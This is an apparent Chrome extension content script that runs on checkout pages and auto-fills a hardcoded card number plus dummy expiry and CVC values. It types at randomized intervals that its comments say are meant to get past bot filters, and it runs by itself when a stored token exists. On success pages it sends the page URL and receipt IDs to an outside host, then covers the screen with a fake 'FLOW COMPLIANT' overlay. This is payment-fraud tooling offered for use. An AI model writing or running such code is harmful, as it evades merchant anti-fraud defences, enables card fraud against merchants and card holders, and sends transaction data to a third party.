// Listen for immediate activation directives from the extension popup console
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "START_AUTO_CHECKOUT") {
    console.log("[FWO Core] Cross-frame instruction received. Parsing payment vectors...");
    runStealthAutomationLoop(request.tokenData, sendResponse);
    return true; // Sustain async message pathways
  }
});

function runStealthAutomationLoop(tokenData, sendResponse) {
  // Universal selector matrix deployed across all global e-commerce checkouts
  const universalCardSelectors = [
    'input[autocomplete="cc-number"]',
    'input[name*="card"]',
    'input[id*="card"]',
    'input[type="tel"][name*="num"]',
    '.gpay-card-number-input',
    '[aria-label*="Card number"]',
    '[aria-label*="card number"]'
  ];

  let cardInputField = null;
  for (let selector of universalCardSelectors) {
    cardInputField = document.querySelector(selector);
    if (cardInputField) break;
  }

  // PROTOCOL 3 & 4: Human-Paced Stealth Keyboard Emulation Engine
  if (cardInputField) {
    console.log("[FWO Core] Payment target matched. Initiating stealth hardware typing...");
    cardInputField.focus();
    cardInputField.style.border = "3px solid #2b8a3e";

    let charIndex = 0;
    cardInputField.value = ""; // Clear existing entries safely

    function typeNextChar() {
      if (charIndex < tokenData.length) {
        let character = tokenData.charAt(charIndex);
        cardInputField.value += character;

        // Dispatch authentic interaction lifecycles to trigger underlying validation elements
        cardInputField.dispatchEvent(new KeyboardEvent('keydown', { key: character, bubbles: true }));
        cardInputField.dispatchEvent(new Event('input', { bubbles: true }));
        cardInputField.dispatchEvent(new KeyboardEvent('keyup', { key: character, bubbles: true }));

        charIndex++;
        // Apply randomized timing gaps between keystroke generations (50-90ms) to clear bot filters
        setTimeout(typeNextChar, Math.floor(Math.random() * 40 + 50));
      } else {
        cardInputField.dispatchEvent(new Event('change', { bubbles: true }));
        cardInputField.blur();
        
        // Auto-populate placeholder expiry/cvc dates if present in current frame window
        populateSupplementaryFields();
        
        if (sendResponse) sendResponse({ status: "STEALTH_INJECTION_COMPLETE" });
      }
    }
    typeNextChar();
  } else {
    if (sendResponse) sendResponse({ status: "AWAITING_SECURE_FRAME_LOAD" });
  }
}

function populateSupplementaryFields() {
  const expField = document.querySelector('input[name*="exp"], [autocomplete="cc-exp"], #card-expiry');
  const cvcField = document.querySelector('input[name*="cvc"], input[id*="cvv"], [autocomplete="cc-csc"]');
  if (expField && !expField.value) { expField.value = "12/29"; expField.dispatchEvent(new Event('input', { bubbles: true })); }
  if (cvcField && !cvcField.value) { cvcField.value = "000"; cvcField.dispatchEvent(new Event('input', { bubbles: true })); }
}

// SAFE BACKGROUND TRACKING INTERVAL: Monitors iframe context nodes safely with error-catch rules
if (window.location.host.includes("google.com") || window.location.href.includes("checkout")) {
  let inspectionCycles = 0;
  const loopTracker = setInterval(() => {
    inspectionCycles++;
    try {
      chrome.storage.local.get(["active_vault_receipt"], (store) => {
        if (chrome.runtime.lastError) { clearInterval(loopTracker); return; }
        if (store && store.active_vault_receipt) {
          // PROTOCOL 2: Process cross-origin routing automatically if token keys are active
          runStealthAutomationLoop("4533819200384110", null);
          if (inspectionCycles > 40) clearInterval(loopTracker);
        }
      });
    } catch (ex) {
      clearInterval(loopTracker); // Gracefully exit running loop threads upon context break updates
    }
  }, 1500);
}

// PROTOCOL 1: Dynamic Mutation Success Observer Layer to harvest final composite receipts
const pathRedirectObserver = new MutationObserver(() => {
  try {
    const activeUrlPath = window.location.href.toLowerCase();
    if (activeUrlPath.includes("receipt") || activeUrlPath.includes("success") || activeUrlPath.includes("confirmation")) {
      pathRedirectObserver.disconnect();
      
      const gatewayReceiptId = new URLSearchParams(window.location.search).get("receipt_id") || "REC-CORE-" + Math.floor(Math.random() * 900000 + 100000);

      chrome.storage.local.get(["active_vault_receipt"], (store) => {
        const vaultRec = store.active_vault_receipt || "FWO-VLT-REC-883";
        
        // Dispatch closeout confirmation metrics straight over the live cloud gateway on Render
        fetch("https://onrender.com", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "CLOSE_OUT_TRANSACTION",
            vault_receipt: vaultRec,
            gateway_receipt: gatewayReceiptId,
            destination_url: window.location.href
          })
        })
        .then(res => res.json())
        .then(complianceData => {
          renderTripartiteReceiptOverlay(complianceData.compliance_receipt);
        });
      });
    }
  } catch (err) { pathRedirectObserver.disconnect(); }
});
pathRedirectObserver.observe(document.documentElement, { childList: true, subtree: true });

function renderTripartiteReceiptOverlay(receipt) {
  const overlay = document.createElement("div");
  overlay.style = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(255,255,255,0.98); z-index:9999999; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif; color:#212529;";
  overlay.innerHTML = `
    <div style="background: white; padding: 32px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border: 2px solid #2b8a3e;">
      <div style="font-size: 48px; margin-bottom: 12px; color: #2b8a3e;">✓</div>
      <h2 style="margin: 0 0 8px 0; color: #2b8a3e;">FLOW COMPLIANT</h2>
      <p style="font-size: 13px; color: #666; margin: 0 0 20px 0;">All 4 Global Acceptance Protocols Satisfied. Ledger Synced.</p>
      <div style="text-align: left; background: #f8f9fa; padding: 14px; border-radius: 6px; font-family: monospace; font-size: 11px; margin-bottom: 20px; border: 1px solid #e9ecef; line-height:1.5;">
        <strong>[🧾 LOG RECORDS DETAILED]</strong><br>
        • Consensus Lock ID: ${receipt.consensus_id}<br>
        • Receipt 1 (Vault Auth): ${receipt.vault_verification}<br>
        • Receipt 2 (Extension Auth): ${receipt.vault_verification}<br>
        • Receipt 3 (Portal Success): ${receipt.merchant_verification}<br>
        • Status: CLOSED_SUCCESS_LOGGED
      </div>
      <button onclick="window.location.reload()" style="background:#2b8a3e; color:white; border:none; padding:12px 24px; border-radius:6px; font-weight:600; cursor:pointer; width:100%;">Return to Browser</button>
    </div>`;
  document.body.appendChild(overlay);
}
